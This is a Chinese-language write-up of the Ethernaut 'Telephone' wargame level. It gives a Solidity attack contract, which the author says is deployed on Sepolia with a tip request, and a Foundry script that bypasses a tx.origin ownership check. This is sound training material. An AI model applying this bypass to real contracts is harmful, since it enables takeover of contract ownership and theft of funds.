# Telephone

https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446

这份合于使用`tx.origin`作为鉴权，只要构造一个attack合约，hacker通过调用attack来调用Telephone合约即可绕过。

attack合约，这份合约已经在sepolia网络部署，地址是0xcb7C523C844Bd266a14449220F56288798AB8170，欢迎大家使用(●'◡'●)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttack {
    address public owner;
    constructor(){
        owner = msg.sender;
    }

    // 求打赏
    function changeOwner(Telephone telephone) public payable {
        if (msg.sender != owner) {
            require(msg.value > 0.0015 ether);
        }

        telephone.changeOwner(msg.sender);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
```

WriteUp

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {TelephoneAttack} from "../src/TelephoneAttack.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    TelephoneAttack public attack;
    Telephone public telephone;

    function setUp() public {
        attack = TelephoneAttack(0xcb7C523C844Bd266a14449220F56288798AB8170);
        telephone = Telephone(0xebA9DAADbE2804454D72aD85d7a9e9C04960aa6f);
    }

    function run() public {
        vm.startBroadcast();

        attack.changeOwner(telephone);

        console.log(telephone.owner());

        vm.stopBroadcast();
    }
}
```